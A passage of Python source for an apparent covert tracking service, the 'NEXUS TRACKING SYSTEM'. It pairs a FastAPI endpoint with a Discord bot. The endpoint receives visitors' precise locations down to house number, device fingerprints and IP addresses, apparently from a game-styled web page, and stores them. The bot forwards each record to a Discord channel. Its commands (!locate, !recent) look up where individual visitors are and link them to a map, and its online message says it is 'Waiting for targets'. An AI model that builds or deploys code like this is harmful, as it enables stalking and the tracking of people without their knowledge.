        """Send system fingerprint to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(title="💻 SYSTEM FINGERPRINT", color=Color.blue(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="Platform", value=f"`{data.get('platform', '?')}`", inline=True)
            embed.add_field(name="Browser", value=f"`{data.get('browser', '?')[:50]}`", inline=True)
            embed.add_field(name="Cores", value=f"`{data.get('cores', '?')}`", inline=True)
            embed.add_field(name="Memory", value=f"`{data.get('memory', '?')}GB`", inline=True)
            embed.add_field(name="Screen", value=f"`{data.get('screen', '?')}`", inline=True)
            embed.add_field(name="Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_fragment_to_discord(self, user_id: str, data: dict, ip: str):
        """Send fragment collection to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(title="🧩 REALITY FRAGMENT FOUND", color=Color.green(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Fragment", value=f"`{data.get('fragment', '?')}/9`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_button_to_discord(self, user_id: str, data: dict, ip: str):
        """Send button press to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(title="🚫 FORBIDDEN BUTTON PRESSED", color=Color.dark_red(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Press #", value=f"`{data.get('presses', '?')}`", inline=True)
            embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_threat_to_discord(self, user_id: str, data: dict, ip: str):
        """Send high threat to Discord"""
        if not self.ready or not self.channel or data.get('level', 0) < 70:
            return
        
        try:
            embed = Embed(title="🚨 CRITICAL THREAT LEVEL", color=Color.dark_red(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Level", value=f"`{data.get('level')}%`", inline=True)
            embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")

discord_bot = DiscordBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Discord bot online as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    discord_bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
    
    if discord_bot.channel:
        print(f'✅ Connected to channel: #{discord_bot.channel.name} (ID: {DISCORD_CHANNEL_ID})')
        discord_bot.ready = True
        
        embed = Embed(
            title="🔮 NEXUS SYSTEM ONLINE",
            description="```Tracking system activated\nWaiting for targets...```",
            color=Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Status", value="✅ Active", inline=True)
        embed.add_field(name="Channel", value=f"#{discord_bot.channel.name}", inline=True)
        
        await discord_bot.channel.send(embed=embed)
    else:
        print(f'❌ Could not find channel with ID: {DISCORD_CHANNEL_ID}')

# ==================== DISCORD COMMANDS ====================
@bot.command(name='stats')
async def stats(ctx):
    """Get tracking statistics"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(DISTINCT user_id) FROM users")
    users = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations")
    total_locations = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-1 hour')")
    locations_1h = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM fragments")
    fragments = c.fetchone()[0] or 0
    
    c.execute("SELECT SUM(press_count) FROM button_presses")
    presses = c.fetchone()[0] or 0
    
    c.execute("SELECT latitude, longitude, address, city, timestamp FROM locations ORDER BY timestamp DESC LIMIT 1")
    latest = c.fetchone()
    
    conn.close()
    
    embed = Embed(title="📊 TRACKING STATISTICS", color=Color.blue())
    embed.add_field(name="Total Users", value=f"`{users}`", inline=True)
    embed.add_field(name="Total Locations", value=f"`{total_locations}`", inline=True)
    embed.add_field(name="Locations (1h)", value=f"`{locations_1h}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{fragments}`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{presses}`", inline=True)
    
    if latest:
        embed.add_field(
            name="Latest Location",
            value=f"```\n{latest[2] or 'Unknown'}\n{latest[3] or 'Unknown'}\n{latest[0]:.6f}, {latest[1]:.6f}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='recent')
async def recent(ctx, limit: int = 5):
    """Show recent locations"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT ?''', (limit,))
    locs = c.fetchall()
    conn.close()
    
    if not locs:
        await ctx.send("No locations found")
        return
    
    embed = Embed(title=f"📍 RECENT LOCATIONS (Last {len(locs)})", color=Color.purple())
    
    for loc in locs:
        time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        location_text = loc[3] or loc[4] or f"{loc[1]:.4f}, {loc[2]:.4f}"
        embed.add_field(
            name=f"User {loc[0][:8]} - {mins_ago}m ago",
            value=f"```{location_text[:50]}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='locate')
async def locate(ctx, user_id: str):
    """Get location for specific user"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT latitude, longitude, accuracy, address, city, state, country, timestamp 
                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
    loc = c.fetchone()
    conn.close()
    
    if not loc:
        await ctx.send(f"No location found for user {user_id}")
        return
    
    embed = Embed(title="📍 USER LOCATION", color=Color.green())
    embed.add_field(name="User ID", value=f"`{user_id}`", inline=False)
    embed.add_field(name="Coordinates", value=f"`{loc[0]:.6f}, {loc[1]:.6f}`", inline=True)
    embed.add_field(name="Accuracy", value=f"`{loc[2]}m`", inline=True)
    
    if loc[3]:
        embed.add_field(name="Address", value=f"```{loc[3][:100]}```", inline=False)
    elif loc[4] and loc[5]:
        embed.add_field(name="Location", value=f"{loc[4]}, {loc[5]}, {loc[6]}", inline=False)
    
    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
    embed.add_field(name="Map", value=f"[View]({maps_url})", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='alert')
async def alert(ctx, *, message: str):
    """Send global alert"""
    embed = Embed(title="⚠️ GLOBAL ALERT", description=f"```{message}```", color=Color.red())
    await ctx.send(embed=embed)

@bot.command(name='help_nexus')
async def help_cmd(ctx):
    """Show help"""
    embed = Embed(title="🔮 NEXUS COMMANDS", color=Color.purple())
    
    commands_list = [
        "`!stats` - Show statistics",
        "`!recent [n]` - Show recent locations",
        "`!locate [user_id]` - Find user location",
        "`!alert [message]` - Send alert",
        "`!help_nexus` - Show this help"
    ]
    
    embed.add_field(name="Available Commands", value="\n".join(commands_list), inline=False)
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.get("/")
async def root():
    """Serve the main HTML page"""
    return HTMLResponse(content=HTML_TEMPLATE)

@app.post("/api/track")
async def track_data(request: Request, data: TrackingData):
    """Receive tracking data from frontend"""
    try:
        client_ip = request.client.host
        user_agent = data.userAgent or request.headers.get('user-agent', '')
        
        # Generate user ID
        user_id = hashlib.sha256(f"{client_ip}_{user_agent}".encode()).hexdigest()[:16]
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Update user
        c.execute('''INSERT OR REPLACE INTO users (id, ip, user_agent, first_seen, last_seen, visit_count)
                     VALUES (?, ?, ?, 
                     COALESCE((SELECT first_seen FROM users WHERE id = ?), ?),
                     ?, 
                     COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                  (user_id, client_ip, user_agent, user_id, datetime.now(), datetime.now(), user_id))
        
        # Store based on type
        if data.type == "location" and data.data.get('lat'):
            c.execute('''INSERT INTO locations 
                        (user_id, latitude, longitude, accuracy, address, city, county, state, zip, country, 
                         neighbourhood, road, house_number, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, 
                      data.data.get('lat'),
                      data.data.get('lon'),
                      data.data.get('accuracy', 1000),
                      data.data.get('address'),
                      data.data.get('city'),
                      data.data.get('county'),
                      data.data.get('state'),
                      data.data.get('zip'),
                      data.data.get('country'),
                      data.data.get('neighbourhood'),
                      data.data.get('road'),
                      data.data.get('house_number'),
                      datetime.now()))
            
            # Add threat
            threat_level = min(100, int(30 + (100 - data.data.get('accuracy', 100)) / 10))
            data.data['threat'] = threat_level
            
            # Send to Discord
            asyncio.create_task(discord_bot.send_location_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "system":
            c.execute('''INSERT INTO fingerprints (user_id, platform, browser, cores, memory, screen, timezone, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, data.data.get('platform'), data.data.get('browser'), data.data.get('cores'),
                      data.data.get('memory'), data.data.get('screen'), data.data.get('timezone'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_system_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "fragment":
            c.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
                        VALUES (?, ?, ?)''', (user_id, data.data.get('fragment'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_fragment_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "button":
            c.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('presses'), data.data.get('message'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_button_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "threat" and data.data.get('level', 0) > 70:
            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('level'), data.data.get('message'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_threat_to_discord(user_id, data.data, client_ip))
        
        conn.commit()
        conn.close()
        
        return JSONResponse({"status": "tracked", "user_id": user_id})
        
    except Exception as e:
        print(f"Error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/health")
async def health():
    """Health check"""
    return {
        "status": "online",
        "bot_ready": discord_bot.ready,
        "timestamp": datetime.now().isoformat()
    }

# ==================== RUN BOTH SERVERS ====================
async def run_bot():
    try:
        await bot.start(DISCORD_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

def start_bot_thread():
    """Start Discord bot in a separate thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

@app.on_event("startup")
async def startup_event():
    """Start Discord bot when FastAPI starts"""
    if DISCORD_TOKEN and DISCORD_CHANNEL_ID:
        thread = threading.Thread(target=start_bot_thread, daemon=True)
        thread.start()
        print("✅ Discord bot thread started")
    else:
        print("❌ Discord credentials missing - bot not started")

if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM")
    print("=" * 50)
    print(f"📡 Discord Token: {DISCORD_TOKEN[:10]}..." if DISCORD_TOKEN else "❌ No Discord token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print(f"📁 Database: {DB_PATH}")
    print("=" * 50)
    
    # Run FastAPI directly
    port = int(os.getenv('PORT', 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
